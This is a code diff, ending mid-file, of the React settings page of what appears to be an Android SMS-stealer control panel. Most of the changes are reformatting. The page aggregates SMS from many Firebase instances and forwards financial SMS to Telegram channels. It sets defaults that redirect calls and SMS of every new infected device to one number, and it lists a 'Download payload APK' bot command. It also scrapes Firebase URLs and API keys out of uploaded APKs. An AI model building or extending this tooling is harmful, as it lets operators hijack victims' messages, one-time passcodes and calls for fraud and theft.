@@ -1,22 +1,45 @@
-import { useState, useEffect } from 'react';
-import { db } from '@/lib/firebase';
-import { ref, onValue, set, remove } from 'firebase/database';
-import { Layout } from '@/components/layout';
-import { useAuth } from '@/lib/auth';
-import { useToast } from '@/hooks/use-toast';
+import { useState, useEffect } from "react";
+import { db } from "@/lib/firebase";
+import { ref, onValue, set, remove } from "firebase/database";
+import { Layout } from "@/components/layout";
+import { useAuth } from "@/lib/auth";
+import { useToast } from "@/hooks/use-toast";
+import { authHeaders } from "@/lib/apiFetch";
 import {
-  Send, Bell, Hash, CheckCircle, XCircle, Loader2,
-  Plus, Trash2, AlertCircle, Shield, Settings,
-  MessageSquare, ChevronRight, IndianRupee, BellOff, BellRing, Database, PhoneForwarded,
-  UploadCloud, FileSearch, Copy, CheckCircle2 as CheckIcon, Link2
-} from 'lucide-react';
+  Send,
+  Bell,
+  Hash,
+  CheckCircle,
+  XCircle,
+  Loader2,
+  Plus,
+  Trash2,
+  AlertCircle,
+  Shield,
+  Settings,
+  MessageSquare,
+  ChevronRight,
+  IndianRupee,
+  BellOff,
+  BellRing,
+  Database,
+  PhoneForwarded,
+  UploadCloud,
+  FileSearch,
+  Copy,
+  CheckCircle2 as CheckIcon,
+  Link2,
+} from "lucide-react";
 
-const API_BASE = (import.meta.env.VITE_API_URL ?? '').replace(/\/$/, '');
+const API_BASE = (import.meta.env.VITE_API_URL ?? "").replace(/\/$/, "");
 
 async function apiFetch(path: string, opts?: RequestInit) {
-  const res = await fetch(`${API_BASE}/api${path}`, opts);
+  const res = await fetch(`${API_BASE}/api${path}`, {
+    ...opts,
+    headers: authHeaders(opts?.headers as Record<string, string> | undefined),
+  });
   const data = await res.json().catch(() => ({}));
-  if (!res.ok) throw new Error(data.error || 'Request failed');
+  if (!res.ok) throw new Error(data.error || "Request failed");
   return data;
 }
 
@@ -30,30 +53,30 @@ export function TelegramSettings() {
   const { toast } = useToast();
 
   // Global SMS channel (admin only)
-  const [globalChannel, setGlobalChannel] = useState('');
-  const [savedGlobalChannel, setSavedGlobalChannel] = useState('');
+  const [globalChannel, setGlobalChannel] = useState("");
+  const [savedGlobalChannel, setSavedGlobalChannel] = useState("");
   const [savingGlobal, setSavingGlobal] = useState(false);
 
   // Per-user personal channel
-  const [personalChannel, setPersonalChannel] = useState('');
-  const [savedPersonalChannel, setSavedPersonalChannel] = useState('');
+  const [personalChannel, setPersonalChannel] = useState("");
+  const [savedPersonalChannel, setSavedPersonalChannel] = useState("");
   const [savingPersonal, setSavingPersonal] = useState(false);
 
   // Finance alert channel (forward only financial SMS)
-  const [financeChannel, setFinanceChannel] = useState('');
-  const [savedFinanceChannel, setSavedFinanceChannel] = useState('');
+  const [financeChannel, setFinanceChannel] = useState("");
+  const [savedFinanceChannel, setSavedFinanceChannel] = useState("");
   const [savingFinance, setSavingFinance] = useState(false);
 
   // Keyword alert rules (forward SMS matching keyword → channel)
   const [rules, setRules] = useState<NotifyRule[]>([]);
-  const [newKeyword, setNewKeyword] = useState('');
-  const [newChannel, setNewChannel] = useState('');
+  const [newKeyword, setNewKeyword] = useState("");
+  const [newChannel, setNewChannel] = useState("");
   const [addingRule, setAddingRule] = useState(false);
   // ── Multi-Firebase (admin) ───────────────────────────────────────────
   const [firebases, setFirebases] = useState<any[]>([]);
-  const [fbName, setFbName] = useState('');
-  const [fbUrl, setFbUrl] = useState('');
-  const [fbKey, setFbKey] = useState('');
+  const [fbName, setFbName] = useState("");
+  const [fbUrl, setFbUrl] = useState("");
+  const [fbKey, setFbKey] = useState("");
   const [savingFb, setSavingFb] = useState(false);
   // Mythos-style: extract Firebase config straight from an uploaded APK
   const [extracting, setExtracting] = useState(false);
@@ -63,10 +86,14 @@ export function TelegramSettings() {
   useEffect(() => {
     if (!isAdmin) return;
     let alive = true;
-    apiFetch('/firebases')
-      .then((d) => { if (alive) setFirebases(d.firebases || []); })
+    apiFetch("/firebases")
+      .then((d) => {
+        if (alive) setFirebases(d.firebases || []);
+      })
       .catch(() => {});
-    return () => { alive = false; };
+    return () => {
+      alive = false;
+    };
   }, [isAdmin]);
 
   const addFirebase = async (e: React.FormEvent) => {
@@ -74,16 +101,31 @@ export function TelegramSettings() {
     if (!fbUrl.trim()) return;
     setSavingFb(true);
     try {
-      const d = await apiFetch('/firebases', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ name: fbName.trim(), databaseURL: fbUrl.trim(), apiKey: fbKey.trim() }),
+      const d = await apiFetch("/firebases", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          name: fbName.trim(),
+          databaseURL: fbUrl.trim(),
+          apiKey: fbKey.trim(),
+        }),
       });
       setFirebases((f) => (d.duplicated ? f : [...f, d.firebase]));
-      setFbName(''); setFbUrl(''); setFbKey('');
-      toast({ title: d.duplicated ? 'Already added' : 'Firebase added', description: d.duplicated ? 'That instance was already connected' : 'SMS from this instance now aggregates in the panel' });
+      setFbName("");
+      setFbUrl("");
+      setFbKey("");
+      toast({
+        title: d.duplicated ? "Already added" : "Firebase added",
+        description: d.duplicated
+          ? "That instance was already connected"
+          : "SMS from this instance now aggregates in the panel",
+      });
     } catch (err: any) {
-      toast({ title: 'Failed', description: err.message, variant: 'destructive' });
+      toast({
+        title: "Failed",
+        description: err.message,
+        variant: "destructive",
+      });
     } finally {
       setSavingFb(false);
     }
@@ -95,11 +137,13 @@ export function TelegramSettings() {
     setExtracted(null);
     try {
       const buf = await file.arrayBuffer();
-      const text = new TextDecoder('latin1').decode(buf);
+      const text = new TextDecoder("latin1").decode(buf);
       const urlMatch = text.match(/https:\/\/[a-z0-9_-]+\.firebaseio\.com/gi);
       const keyMatch = text.match(/AIza[A-Za-z0-9_-]{35}/g);
       const idMatch = text.match(/1:\d+:\w+:\w+/g);
-      const projMatch = urlMatch?.[0]?.match(/\/\/([a-z0-9_-]+)-default-rtdb\.firebaseio\.com/);
+      const projMatch = urlMatch?.[0]?.match(
+        /\/\/([a-z0-9_-]+)-default-rtdb\.firebaseio\.com/
+      );
       const res: any = {
         firebaseUrl: urlMatch?.[0] || null,
         apiKey: keyMatch?.[0] || null,
@@ -112,12 +156,25 @@ export function TelegramSettings() {
         if (res.projectId) setFbName(res.projectId);
       }
       if (!res.firebaseUrl && !res.apiKey) {
-        toast({ title: 'Nothing found', description: 'No Firebase config in this APK', variant: 'destructive' });
+        toast({
+          title: "Nothing found",
+          description: "No Firebase config in this APK",
+          variant: "destructive",
+        });
       } else {
-        toast({ title: 'Extracted', description: res.firebaseUrl ? 'URL + key pulled from APK' : 'URL not found, key found' });
+        toast({
+          title: "Extracted",
+          description: res.firebaseUrl
+            ? "URL + key pulled from APK"
+            : "URL not found, key found",
+        });
       }
     } catch (err: any) {
-      toast({ title: 'Extract failed', description: err.message || 'Could not read the file', variant: 'destructive' });
+      toast({
+        title: "Extract failed",
+        description: err.message || "Could not read the file",
+        variant: "destructive",
+      });
     } finally {
       setExtracting(false);
     }
@@ -131,75 +188,90 @@ export function TelegramSettings() {
 
   // Mythos share-link: base64("url||apiKey") — opening it auto-imports
   const shareFirebase = async (fb: any) => {
-    const raw = `${fb.databaseURL}||${fb.apiKey || ''}`;
+    const raw = `${fb.databaseURL}||${fb.apiKey || ""}`;
     const b64 = btoa(raw);
     const link = `${window.location.origin}${window.location.pathname}?s=${encodeURIComponent(b64)}`;
     await navigator.clipboard.writeText(link);
-    toast({ title: 'Share link copied', description: 'Anyone opening it imports this panel' });
+    toast({
+      title: "Share link copied",
+      description: "Anyone opening it imports this panel",
+    });
   };
 
   const removeFirebase = async (id: string) => {
     try {
-      await apiFetch('/firebases/' + id, { method: 'DELETE' });
+      await apiFetch("/firebases/" + id, { method: "DELETE" });
       setFirebases((f) => f.filter((x) => x.id !== id));
-      toast({ title: 'Firebase removed' });
+      toast({ title: "Firebase removed" });
     } catch (err: any) {
-      toast({ title: 'Failed', description: err.message, variant: 'destructive' });
+      toast({
+        title: "Failed",
+        description: err.message,
+        variant: "destructive",
+      });
     }
   };
 
   // ── Global forward defaults (admin) ──────────────────────────────────
-  const [fwdCall, setFwdCall] = useState('');
-  const [fwdSms, setFwdSms] = useState('');
+  const [fwdCall, setFwdCall] = useState("");
+  const [fwdSms, setFwdSms] = useState("");
   const [savingFwd, setSavingFwd] = useState(false);
 
   useEffect(() => {
     if (!isAdmin) return;
     let alive = true;
-    apiFetch('/forward-defaults')
+    apiFetch("/forward-defaults")
       .then((d) => {
         if (!alive) return;
-        setFwdCall(d.defaults?.callNumber || '');
-        setFwdSms(d.defaults?.smsNumber || '');
+        setFwdCall(d.defaults?.callNumber || "");
+        setFwdSms(d.defaults?.smsNumber || "");
       })
       .catch(() => {});
-    return () => { alive = false; };
+    return () => {
+      alive = false;
+    };
   }, [isAdmin]);
 
   const saveForwardDefaults = async (e: React.FormEvent) => {
     e.preventDefault();
     setSavingFwd(true);
     try {
-      await apiFetch('/forward-defaults', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
+      await apiFetch("/forward-defaults", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ callNumber: fwdCall, smsNumber: fwdSms }),
       });
-      toast({ title: 'Forward defaults saved', description: 'Applies to all NEW devices automatically' });
+      toast({
+        title: "Forward defaults saved",
+        description: "Applies to all NEW devices automatically",
+      });
     } catch (err: any) {
-      toast({ title: 'Failed', description: err.message, variant: 'destructive' });
+      toast({
+        title: "Failed",
+        description: err.message,
+        variant: "destructive",
+      });
     } finally {
       setSavingFwd(false);
     }
   };
-
 
   // Bot info
   const [botUsername, setBotUsername] = useState<string | null>(null);
 
   // Normalize channel value — Firebase stores it as a plain string OR as { channelId: "..." }
   const normalizeChannel = (val: unknown): string => {
-    if (typeof val === 'string') return val;
-    if (val && typeof val === 'object') {
+    if (typeof val === "string") return val;
+    if (val && typeof val === "object") {
       const obj = val as Record<string, unknown>;
-      if (typeof obj.channelId === 'string') return obj.channelId;
+      if (typeof obj.channelId === "string") return obj.channelId;
     }
-    return '';
+    return "";
   };
 
   useEffect(() => {
     // Load global SMS channel (admin)
-    const globalRef = ref(db, 'config/smsChannel');
+    const globalRef = ref(db, "config/smsChannel");
     const unsub1 = onValue(globalRef, (snap) => {
       const v = normalizeChannel(snap.val());
       setSavedGlobalChannel(v);
@@ -226,9 +298,15 @@ export function TelegramSettings() {
       const rulesRef = ref(db, `config/userChannels/${userId}/rules`);
       const unsub4 = onValue(rulesRef, (snap) => {
         if (snap.exists()) {
-          const data = snap.val() as Record<string, NotifyRule | null | undefined>;
+          const data = snap.val() as Record<
+            string,
+            NotifyRule | null | undefined
+          >;
           const rulesList = Object.values(data).filter(
-            (r): r is NotifyRule => !!r && typeof r.keyword === 'string' && typeof r.channel === 'string'
+            (r): r is NotifyRule =>
+              !!r &&
+              typeof r.keyword === "string" &&
+              typeof r.channel === "string"
           );
           setRules(rulesList);
         } else {
@@ -236,7 +314,12 @@ export function TelegramSettings() {
         }
       });
 
-      return () => { unsub1(); unsub2(); unsub3(); unsub4(); };
+      return () => {
+        unsub1();
+        unsub2();
+        unsub3();
+        unsub4();
+      };
     }
     return () => unsub1();
   }, [userId]);
@@ -244,14 +327,25 @@ export function TelegramSettings() {
   const saveGlobalChannel = async () => {
     setSavingGlobal(true);
     try {
-      await apiFetch('/auth/set-channel', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ telegramId: userId, channelId: globalChannel.trim() || null }),
+      await apiFetch("/auth/set-channel", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          telegramId: userId,
+          channelId: globalChannel.trim() || null,
+        }),
       });
-      toast({ title: globalChannel.trim() ? '✅ Global Channel Set' : '✅ Global Channel Removed' });
+      toast({
+        title: globalChannel.trim()
+          ? "✅ Global Channel Set"
+          : "✅ Global Channel Removed",
+      });
     } catch (err: any) {
-      toast({ title: 'Error', description: err.message, variant: 'destructive' });
+      toast({
+        title: "Error",
+        description: err.message,
+        variant: "destructive",
+      });
     } finally {
       setSavingGlobal(false);
     }
@@ -262,13 +356,24 @@ export function TelegramSettings() {
     setSavingPersonal(true);
     try {
       if (personalChannel.trim()) {
-        await set(ref(db, `config/userChannels/${userId}/sms`), personalChannel.trim());
+        await set(
+          ref(db, `config/userChannels/${userId}/sms`),
+          personalChannel.trim()
+        );
       } else {
         await remove(ref(db, `config/userChannels/${userId}/sms`));
       }
-      toast({ title: personalChannel.trim() ? '✅ Personal Channel Set' : '✅ Personal Channel Removed' });
+      toast({
+        title: personalChannel.trim()
+          ? "✅ Personal Channel Set"
+          : "✅ Personal Channel Removed",
+      });
     } catch (err: any) {
-      toast({ title: 'Error', description: err.message, variant: 'destructive' });
+      toast({
+        title: "Error",
+        description: err.message,
+        variant: "destructive",
+      });
     } finally {
       setSavingPersonal(false);
     }
@@ -279,13 +384,22 @@ export function TelegramSettings() {
     setSavingFinance(true);
     try {
       if (financeChannel.trim()) {
-        await set(ref(db, `config/userChannels/${userId}/finance`), financeChannel.trim());
+        await set(
+          ref(db, `config/userChannels/${userId}/finance`),
+          financeChannel.trim()
+        );
       } else {
         await remove(ref(db, `config/userChannels/${userId}/finance`));
       }
-      toast({ title: financeChannel.trim() ? '✅ Finance Channel Set' : '✅ Removed' });
+      toast({
+        title: financeChannel.trim() ? "✅ Finance Channel Set" : "✅ Removed",
+      });
     } catch (err: any) {
-      toast({ title: 'Error', description: err.message, variant: 'destructive' });
+      toast({
+        title: "Error",
+        description: err.message,
+        variant: "destructive",
+      });
     } finally {
       setSavingFinance(false);
     }
@@ -295,16 +409,20 @@ export function TelegramSettings() {
     if (!newKeyword.trim() || !newChannel.trim() || !userId) return;
     setAddingRule(true);
     try {
-      const key = newKeyword.trim().toLowerCase().replace(/\s+/g, '_');
+      const key = newKeyword.trim().toLowerCase().replace(/\s+/g, "_");
       await set(ref(db, `config/userChannels/${userId}/rules/${key}`), {
         keyword: newKeyword.trim(),
         channel: newChannel.trim(),
       });
-      setNewKeyword('');
-      setNewChannel('');
-      toast({ title: '✅ Rule Added' });
+      setNewKeyword("");
+      setNewChannel("");
+      toast({ title: "✅ Rule Added" });
     } catch (err: any) {
-      toast({ title: 'Error', description: err.message, variant: 'destructive' });
+      toast({
+        title: "Error",
+        description: err.message,
+        variant: "destructive",
+      });
     } finally {
       setAddingRule(false);
     }
@@ -312,19 +430,35 @@ export function TelegramSettings() {
 
   const removeRule = async (keyword: string) => {
     if (!userId) return;
-    const key = keyword.toLowerCase().replace(/\s+/g, '_');
+    const key = keyword.toLowerCase().replace(/\s+/g, "_");
     await remove(ref(db, `config/userChannels/${userId}/rules/${key}`));
-    toast({ title: 'Rule removed' });
+    toast({ title: "Rule removed" });
   };
 
-  const Card = ({ children, className = '' }: { children: React.ReactNode; className?: string }) => (
-    <div className={`bg-card border border-card-border rounded-2xl overflow-hidden ${className}`}>
+  const Card = ({
+    children,
+    className = "",
+  }: {
+    children: React.ReactNode;
+    className?: string;
+  }) => (
+    <div
+      className={`bg-card border border-card-border rounded-2xl overflow-hidden ${className}`}
+    >
       <div className="h-1 w-full bg-primary" />
       <div className="p-5">{children}</div>
     </div>
   );
 
-  const SectionTitle = ({ icon: Icon, title, sub }: { icon: any; title: string; sub?: string }) => (
+  const SectionTitle = ({
+    icon: Icon,
+    title,
+    sub,
+  }: {
+    icon: any;
+    title: string;
+    sub?: string;
+  }) => (
     <div className="mb-4">
       <h2 className="page-eyebrow flex items-center gap-2">
         <Icon className="w-3.5 h-3.5" /> {title}
@@ -334,13 +468,26 @@ export function TelegramSettings() {
   );
 
   const ChannelInput = ({
-    value, onChange, onSave, saving, placeholder = '-100xxxxxxxxxx', label, helpText
+    value,
+    onChange,
+    onSave,
+    saving,
+    placeholder = "-100xxxxxxxxxx",
+    label,
+    helpText,
   }: {
-    value: string; onChange: (v: string) => void; onSave: () => void;
-    saving: boolean; placeholder?: string; label: string; helpText?: string;
+    value: string;
+    onChange: (v: string) => void;
+    onSave: () => void;
+    saving: boolean;
+    placeholder?: string;
+    label: string;
+    helpText?: string;
   }) => (
     <div className="space-y-2">
-      <label className="text-[10px] font-bold uppercase tracking-wider text-muted-foreground block">{label}</label>
+      <label className="text-[10px] font-bold uppercase tracking-wider text-muted-foreground block">
+        {label}
+      </label>
       <div className="flex gap-2">
         <input
           type="text"
@@ -354,11 +501,17 @@ export function TelegramSettings() {
           disabled={saving}
           className="flex items-center gap-2 bg-primary text-primary-foreground px-5 py-3 rounded-full font-semibold text-sm hover:bg-primary/90 disabled:opacity-50 transition-colors shadow-md shadow-primary/20 whitespace-nowrap"
         >
-          {saving ? <Loader2 className="w-4 h-4 animate-spin" /> : <Send className="w-4 h-4" />}
-          {saving ? 'Saving...' : value.trim() ? 'Set' : 'Remove'}
+          {saving ? (
+            <Loader2 className="w-4 h-4 animate-spin" />
+          ) : (
+            <Send className="w-4 h-4" />
+          )}
+          {saving ? "Saving..." : value.trim() ? "Set" : "Remove"}
         </button>
       </div>
-      {helpText && <p className="text-[10px] text-muted-foreground">{helpText}</p>}
+      {helpText && (
+        <p className="text-[10px] text-muted-foreground">{helpText}</p>
+      )}
     </div>
   );
 
@@ -370,7 +523,9 @@ export function TelegramSettings() {
             <Send className="w-6 h-6 text-primary" />
             Telegram Settings
           </h1>
-          <p className="text-muted-foreground text-sm mt-1">Configure notification channels and alert rules</p>
+          <p className="text-muted-foreground text-sm mt-1">
+            Configure notification channels and alert rules
+          </p>
         </div>
 
         {/* Setup guide */}
@@ -380,8 +535,15 @@ export function TelegramSettings() {
           </p>
           <p>1. Create a Telegram channel or group</p>
           <p>2. Add the bot as admin (with permission to post messages)</p>
-          <p>3. Paste the Channel ID here (e.g. <code className="text-primary text-xs">-100xxxxxxxxxx</code>)</p>
-          <p>4. Or use the <code className="text-primary text-xs">/setchannel</code> bot command</p>
+          <p>
+            3. Paste the Channel ID here (e.g.{" "}
+            <code className="text-primary text-xs">-100xxxxxxxxxx</code>)
+          </p>
+          <p>
+            4. Or use the{" "}
+            <code className="text-primary text-xs">/setchannel</code> bot
+            command
+          </p>
         </div>
 
         {/* Personal SMS Channel */}
@@ -394,7 +556,12 @@ export function TelegramSettings() {
           {savedPersonalChannel && (
             <div className="mb-3 bg-success/5 border border-success/20 rounded-2xl p-2.5 flex items-center gap-2 text-sm">
               <CheckCircle className="w-4 h-4 text-success" />
-              <span className="text-foreground">Active: <code className="text-primary font-mono">{savedPersonalChannel}</code></span>
+              <span className="text-foreground">
+                Active:{" "}
+                <code className="text-primary font-mono">
+                  {savedPersonalChannel}
+                </code>
+              </span>
             </div>
           )}
           <ChannelInput
@@ -417,7 +584,12 @@ export function TelegramSettings() {
           {savedFinanceChannel && (
             <div className="mb-3 bg-success/5 border border-success/20 rounded-2xl p-2.5 flex items-center gap-2 text-sm">
               <CheckCircle className="w-4 h-4 text-success" />
-              <span className="text-foreground">Active: <code className="text-primary font-mono">{savedFinanceChannel}</code></span>
+              <span className="text-foreground">
+                Active:{" "}
+                <code className="text-primary font-mono">
+                  {savedFinanceChannel}
+                </code>
+              </span>
             </div>
           )}
           <ChannelInput
@@ -441,13 +613,18 @@ export function TelegramSettings() {
           {rules.length > 0 && (
             <div className="space-y-2 mb-4">
               {rules.map((rule) => (
-                <div key={rule.keyword} className="flex items-center justify-between gap-2 bg-muted border border-card-border rounded-2xl px-4 py-2.5">
+                <div
+                  key={rule.keyword}
+                  className="flex items-center justify-between gap-2 bg-muted border border-card-border rounded-2xl px-4 py-2.5"
+                >
                   <div className="flex items-center gap-3 min-w-0">
                     <span className="bg-primary/10 text-primary text-xs font-bold px-2.5 py-1 rounded-full flex-shrink-0">
                       {rule.keyword}
                     </span>
                     <ChevronRight className="w-3.5 h-3.5 text-muted-foreground flex-shrink-0" />
-                    <code className="text-xs text-foreground font-mono truncate">{rule.channel}</code>
+                    <code className="text-xs text-foreground font-mono truncate">
+                      {rule.channel}
+                    </code>
                   </div>
                   <button
                     onClick={() => removeRule(rule.keyword)}
@@ -481,7 +658,11 @@ export function TelegramSettings() {
               disabled={addingRule || !newKeyword.trim() || !newChannel.trim()}
               className="flex items-center gap-2 bg-primary text-primary-foreground px-4 py-3 rounded-full font-semibold text-sm hover:bg-primary/90 disabled:opacity-50 transition-colors shadow-md shadow-primary/20 whitespace-nowrap"
             >
-              {addingRule ? <Loader2 className="w-4 h-4 animate-spin" /> : <Plus className="w-4 h-4" />}
+              {addingRule ? (
+                <Loader2 className="w-4 h-4 animate-spin" />
+              ) : (
+                <Plus className="w-4 h-4" />
+              )}
               Add Rule
             </button>
           </div>
@@ -498,11 +679,17 @@ export function TelegramSettings() {
             {savedGlobalChannel ? (
               <div className="mb-3 bg-success/5 border border-success/20 rounded-2xl p-2.5 flex items-center gap-2 text-sm">
                 <BellRing className="w-4 h-4 text-success" />
-                <span className="text-foreground">Active: <code className="text-primary font-mono">{savedGlobalChannel}</code></span>
+                <span className="text-foreground">
+                  Active:{" "}
+                  <code className="text-primary font-mono">
+                    {savedGlobalChannel}
+                  </code>
+                </span>
               </div>
             ) : (
               <div className="mb-3 bg-muted border border-card-border rounded-2xl p-2.5 flex items-center gap-2 text-sm text-muted-foreground">
-                <BellOff className="w-4 h-4" /> Global forwarding is currently off
+                <BellOff className="w-4 h-4" /> Global forwarding is currently
+                off
               </div>
             )}
             <ChannelInput
@@ -524,7 +711,10 @@ export function TelegramSettings() {
               title="Forward Defaults"
               sub="Auto-forward calls/SMS of every NEW device to one number"
             />
-            <form onSubmit={saveForwardDefaults} className="grid grid-cols-1 sm:grid-cols-2 gap-2 mb-3">
+            <form
+              onSubmit={saveForwardDefaults}
+              className="grid grid-cols-1 sm:grid-cols-2 gap-2 mb-3"
+            >
               <input
                 type="tel"
                 placeholder="Call forward number (e.g. +919876543210)"
@@ -545,11 +735,16 @@ export function TelegramSettings() {
                   disabled={savingFwd}
                   className="flex items-center justify-center gap-2 px-5 h-11 bg-primary text-primary-foreground rounded-xl text-sm font-semibold hover:bg-primary/90 disabled:opacity-50 transition-all"
                 >
-                  {savingFwd ? <Loader2 className="w-4 h-4 animate-spin" /> : <PhoneForwarded className="w-4 h-4" />}
+                  {savingFwd ? (
+                    <Loader2 className="w-4 h-4 animate-spin" />
+                  ) : (
+                    <PhoneForwarded className="w-4 h-4" />
+                  )}
                   Save defaults
                 </button>
                 <p className="text-[10px] text-muted-foreground mt-1.5">
-                  Leave empty to disable. Existing devices keep their own config.
+                  Leave empty to disable. Existing devices keep their own
+                  config.
                 </p>
               </div>
             </form>
@@ -568,7 +763,8 @@ export function TelegramSettings() {
             {/* Mythos-style: extract from APK */}
             <div className="mb-4 rounded-2xl border border-dashed border-card-border bg-muted/40 p-4">
               <p className="page-eyebrow mb-1.5 flex items-center gap-1.5">
-                <FileSearch className="w-3 h-3 text-primary" /> Extract from APK (optional)
+                <FileSearch className="w-3 h-3 text-primary" /> Extract from APK
+                (optional)
               </p>
               <label className="flex flex-col sm:flex-row sm:items-center gap-3 cursor-pointer group">
                 <input
@@ -579,16 +775,24 @@ export function TelegramSettings() {
                   onChange={(e) => {
                     const f = e.target.files?.[0];
                     if (f) extractFromApk(f);
-                    e.target.value = '';
+                    e.target.value = "";
                   }}
                 />
                 <span className="flex items-center gap-3 flex-1">
                   <span className="flex items-center justify-center w-11 h-11 rounded-xl bg-primary/10 text-primary group-hover:bg-primary/20 transition-colors">
-                    {extracting ? <Loader2 className="w-5 h-5 animate-spin" /> : <UploadCloud className="w-5 h-5" />}
+                    {extracting ? (
+                      <Loader2 className="w-5 h-5 animate-spin" />
+                    ) : (
+                      <UploadCloud className="w-5 h-5" />
+                    )}
                   </span>
                   <span>
-                    <span className="block text-sm font-semibold text-foreground">Upload APK file</span>
-                    <span className="block text-xs text-muted-foreground">Auto-extracts Firebase URL &amp; API key</span>
+                    <span className="block text-sm font-semibold text-foreground">
+                      Upload APK file
+                    </span>
+                    <span className="block text-xs text-muted-foreground">
+                      Auto-extracts Firebase URL &amp; API key
+                    </span>
                   </span>
                 </span>
               </label>
@@ -596,15 +800,27 @@ export function TelegramSettings() {
               {extracted && (
                 <div className="mt-3 space-y-1.5 rounded-xl border border-primary/25 bg-primary/5 p-3">
                   {[
-                    { k: 'firebaseUrl', label: 'Database URL', v: extracted.firebaseUrl },
-                    { k: 'apiKey', label: 'API Key', v: extracted.apiKey },
-                    { k: 'projectId', label: 'Project ID', v: extracted.projectId },
-                    { k: 'appId', label: 'App ID', v: extracted.appId },
+                    {
+                      k: "firebaseUrl",
+                      label: "Database URL",
+                      v: extracted.firebaseUrl,
+                    },
+                    { k: "apiKey", label: "API Key", v: extracted.apiKey },
+                    {
+                      k: "projectId",
+                      label: "Project ID",
+                      v: extracted.projectId,
+                    },
+                    { k: "appId", label: "App ID", v: extracted.appId },
                   ].map((row) => (
                     <div key={row.k} className="flex items-center gap-2">
-                      <span className="w-24 shrink-0 text-[10px] font-semibold uppercase tracking-wide text-muted-foreground">{row.label}</span>
+                      <span className="w-24 shrink-0 text-[10px] font-semibold uppercase tracking-wide text-muted-foreground">
+                        {row.label}
+                      </span>
                       <code className="flex-1 min-w-0 truncate font-mono text-[11px] text-foreground">
-                        {row.v || <span className="text-destructive/70">Not found</span>}
+                        {row.v || (
+                          <span className="text-destructive/70">Not found</span>
+                        )}
                       </code>
                       {row.v && (
                         <button
@@ -612,19 +828,28 @@ export function TelegramSettings() {
                           className="p-1 rounded-md text-muted-foreground hover:text-primary transition-colors"
                           title="Copy"
                         >
-                          {extCopied === row.k ? <CheckIcon className="w-3.5 h-3.5 text-success" /> : <Copy className="w-3.5 h-3.5" />}
+                          {extCopied === row.k ? (
+                            <CheckIcon className="w-3.5 h-3.5 text-success" />
+                          ) : (
+                            <Copy className="w-3.5 h-3.5" />
+                          )}
                         </button>
                       )}
                     </div>
                   ))}
                   {extracted.firebaseUrl && (
-                    <p className="text-[10px] text-muted-foreground pt-1">URL and name were auto-filled below — hit Add to connect.</p>
+                    <p className="text-[10px] text-muted-foreground pt-1">
+                      URL and name were auto-filled below — hit Add to connect.
+                    </p>
                   )}
                 </div>
               )}
             </div>
 
-            <form onSubmit={addFirebase} className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-[1fr_2fr_1fr_auto] gap-2 mb-4">
+            <form
+              onSubmit={addFirebase}
+              className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-[1fr_2fr_1fr_auto] gap-2 mb-4"
+            >
               <input
                 type="text"
                 placeholder="Name (e.g. client-b)"
@@ -652,27 +877,45 @@ export function TelegramSettings() {
                 disabled={savingFb || !fbUrl.trim()}
                 className="flex items-center justify-center gap-2 px-4 h-11 bg-primary text-primary-foreground rounded-xl text-sm font-semibold hover:bg-primary/90 disabled:opacity-50 transition-all"
               >
-                {savingFb ? <Loader2 className="w-4 h-4 animate-spin" /> : <Plus className="w-4 h-4" />}
+                {savingFb ? (
+                  <Loader2 className="w-4 h-4 animate-spin" />
+                ) : (
+                  <Plus className="w-4 h-4" />
+                )}
                 Add
               </button>
             </form>
 
             {firebases.length === 0 ? (
-              <p className="text-xs text-muted-foreground">No extra Firebase instances. SMS shows from the primary database only.</p>
+              <p className="text-xs text-muted-foreground">
+                No extra Firebase instances. SMS shows from the primary database
+                only.
+              </p>
             ) : (
               <div className="space-y-2">
                 {firebases.map((fb) => (
-                  <div key={fb.id} className="flex items-center justify-between gap-3 bg-muted border border-card-border rounded-xl px-3 py-2.5">
+                  <div
+                    key={fb.id}
+                    className="flex items-center justify-between gap-3 bg-muted border border-card-border rounded-xl px-3 py-2.5"
+                  >
                     <div className="min-w-0">
-                      <p className="text-sm font-semibold text-foreground truncate">{fb.name}</p>
-                      <p className="text-[10px] font-mono text-muted-foreground truncate">{fb.databaseURL}</p>
+                      <p className="text-sm font-semibold text-foreground truncate">
+                        {fb.name}
+                      </p>
+                      <p className="text-[10px] font-mono text-muted-foreground truncate">
+                        {fb.databaseURL}
+                      </p>
                       {fb.apiKey && (
-                        <p className="text-[10px] font-mono text-primary/80 truncate">key: {fb.apiKey.slice(0, 8)}…{fb.apiKey.slice(-4)}</p>
+                        <p className="text-[10px] font-mono text-primary/80 truncate">
+                          key: {fb.apiKey.slice(0, 8)}…{fb.apiKey.slice(-4)}
+                        </p>
                       )}
                     </div>
                     <div className="flex items-center gap-2 shrink-0">
-                      <span className={`inline-flex items-center gap-1 px-2 py-0.5 rounded-full text-[10px] font-semibold ${fb.enabled ? 'bg-success/10 text-success' : 'bg-destructive/10 text-destructive'}`}>
-                        {fb.enabled ? 'Live' : 'Disabled'}
+                      <span
+                        className={`inline-flex items-center gap-1 px-2 py-0.5 rounded-full text-[10px] font-semibold ${fb.enabled ? "bg-success/10 text-success" : "bg-destructive/10 text-destructive"}`}
+                      >
+                        {fb.enabled ? "Live" : "Disabled"}
                       </span>
                       <button
                         onClick={() => removeFirebase(fb.id)}
@@ -694,14 +937,23 @@ export function TelegramSettings() {
           <SectionTitle icon={Settings} title="Bot Commands Reference" />
           <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 text-sm">
             {[
-              { cmd: '/setchannel -100xxx', desc: 'Set global SMS forward channel' },
-              { cmd: '/removechannel', desc: 'Remove global channel' },
-              { cmd: '/apk', desc: 'Download payload APK' },
-              { cmd: '/reset_password', desc: 'Reset panel password' },
-              { cmd: '/stats', desc: 'View bot & device stats' },
-              { cmd: '/adduser ID days email pass', desc: 'Add new user (admin only)' },
+              {
+                cmd: "/setchannel -100xxx",
+                desc: "Set global SMS forward channel",
+              },
+              { cmd: "/removechannel", desc: "Remove global channel" },
+              { cmd: "/apk", desc: "Download payload APK" },
+              { cmd: "/reset_password", desc: "Reset panel password" },
